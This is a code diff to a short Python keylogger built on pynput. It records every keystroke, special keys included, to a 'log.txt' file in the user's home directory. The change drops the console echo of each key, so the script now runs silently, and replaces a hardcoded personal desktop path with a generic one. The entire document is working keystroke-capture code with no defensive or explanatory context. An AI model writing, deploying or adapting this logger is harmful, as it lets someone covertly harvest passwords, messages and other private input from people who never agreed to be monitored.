@@ -1,20 +1,18 @@
 from pynput import keyboard
+import os
+
+path = os.path.join(os.path.expanduser("~"), "log.txt")
 
 def keyPressed(key):
     try:
-        print("Key pressed: {0}".format(key.char))
-        file = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
-        file.write(key.char +"\n")
+        with open(path, "a", encoding="utf-8") as file:
+            file.write(f"{key.char}\n")
     except AttributeError:
-        print("Key pressed: {0}".format(key))
-        file = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
-        file.write("\n"+str(key)+"\n")
+        with open(path, "a", encoding="utf-8") as file:
+            file.write(f"\n{key}\n")
+
 def keyReleased(key):
-    # print("Key released: {0}".format(key.char))
     pass
 
 with keyboard.Listener(on_press=keyPressed, on_release=keyReleased) as listener:
     listener.join()
-
-listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
-listener.start()
